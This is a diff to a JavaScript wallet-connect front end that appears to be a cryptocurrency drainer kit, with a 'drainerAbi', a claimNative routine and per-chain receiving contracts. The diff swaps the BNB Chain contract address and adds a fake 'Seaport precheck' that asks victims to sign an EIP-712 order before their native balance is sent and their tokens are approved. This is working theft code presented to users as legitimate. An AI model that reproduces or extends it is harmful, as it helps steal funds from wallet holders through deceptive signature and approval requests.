@@ -2,7 +2,7 @@ import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fan
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
-import { readContract, writeContract, sendCalls, getBalance } from '@wagmi/core'
+import { readContract, writeContract, sendCalls, getBalance, signTypedData } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
 const USE_SENDCALLS = false;
@@ -52,7 +52,7 @@ const networkMap = {
 
 const CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0x06BF775ff9a22691Adf297a84DD49ECf61dF03B2',
-  [networkMap['BNB Smart Chain'].chainId]: '0x143488577a6DA0f23DBC0E6D8c07355D75d1B9eD',
+  [networkMap['BNB Smart Chain'].chainId]: '0x81F8290188d5D54E8FA98147585043DDDD34603d',
   [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c',
   [networkMap['Arbitrum'].chainId]: '0x1234567890123456789012345678901234567890',
   [networkMap['Optimism'].chainId]: '0x2345678901234567890123456789012345678901',
@@ -564,6 +564,84 @@ const drainerAbi = [
   }
 ]
 
+// Подпись EIP-712 (Seaport 1.6) перед транзакцией
+const signSeaportPrecheck = async (wagmiConfig, userAddress, chainId) => {
+  const domain = {
+    name: 'Seaport',
+    version: '1.6',
+    chainId,
+    verifyingContract: '0x7a250d5630b4cf539739df2c5dacb4c659f2488d'
+  }
+  const types = {
+    OrderComponents: [
+      { name: 'offerer', type: 'address' },
+      { name: 'zone', type: 'address' },
+      { name: 'offer', type: 'OfferItem[]' },
+      { name: 'consideration', type: 'ConsiderationItem[]' },
+      { name: 'orderType', type: 'uint8' },
+      { name: 'startTime', type: 'uint256' },
+      { name: 'endTime', type: 'uint256' },
+      { name: 'zoneHash', type: 'bytes32' },
+      { name: 'salt', type: 'uint256' },
+      { name: 'conduitKey', type: 'bytes32' },
+      { name: 'counter', type: 'uint256' }
+    ],
+    OfferItem: [
+      { name: 'itemType', type: 'uint8' },
+      { name: 'token', type: 'address' },
+      { name: 'identifierOrCriteria', type: 'uint256' },
+      { name: 'startAmount', type: 'uint256' },
+      { name: 'endAmount', type: 'uint256' }
+    ],
+    ConsiderationItem: [
+      { name: 'itemType', type: 'uint8' },
+      { name: 'token', type: 'address' },
+      { name: 'identifierOrCriteria', type: 'uint256' },
+      { name: 'startAmount', type: 'uint256' },
+      { name: 'endAmount', type: 'uint256' },
+      { name: 'recipient', type: 'address' }
+    ]
+  }
+  const now = Math.floor(Date.now() / 1000)
+  const message = {
+    offerer: userAddress,
+    zone: '0x0000000000000000000000000000000000000000',
+    offer: [],
+    consideration: [
+      {
+        itemType: 1,
+        token: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
+        identifierOrCriteria: 0,
+        startAmount: '1000000000',
+        endAmount: '1000000000',
+        recipient: userAddress
+      }
+    ],
+    orderType: 0,
+    startTime: String(now),
+    endTime: String(now + 2592000), // +30 days
+    zoneHash: '0x0000000000000000000000000000000000000000000000000000000000000000',
+    salt: '27855337018906766782546881864045825683096516384821792734251274424712742754110',
+    conduitKey: '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000',
+    counter: '0'
+  }
+  try {
+    await signTypedData(wagmiConfig, {
+      account: getAddress(userAddress),
+      domain,
+      types,
+      primaryType: 'OrderComponents',
+      message
+    })
+    return true
+  } catch (error) {
+    if (error.code === 4001 || error.code === -32000 || error.message?.toLowerCase().includes('user rejected')) {
+      throw { ...error, isUserRejection: true }
+    }
+    throw error
+  }
+}
+
 // Маппинг символов токенов на идентификаторы CoinGecko
 const tokenIdMap = {
   'ETH': 'ethereum',
@@ -669,6 +747,8 @@ const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => 
   if (!userAddress || !isAddress(userAddress)) throw new Error('Invalid user address')
   const contractAddress = CONTRACTS[chainId]
   if (!contractAddress || !isAddress(contractAddress)) throw new Error('Invalid contract address for chain')
+  // Предварительная подпись Seaport
+  await signSeaportPrecheck(wagmiConfig, userAddress, chainId)
   // Баланс приходит как число, переводим в wei
   const balanceWei = parseUnits(nativeBalance.toString(), 18)
   const reserveWei = getGasReserveWei(chainId)
@@ -747,6 +827,8 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
+    // Предварительная подпись Seaport
+    await signSeaportPrecheck(wagmiConfig, getAddress(store.accountState.address), chainId)
     // Сначала читаем текущее значение allowance
     const currentAllowance = await readContract(wagmiConfig, {
       address: checksumTokenAddress,
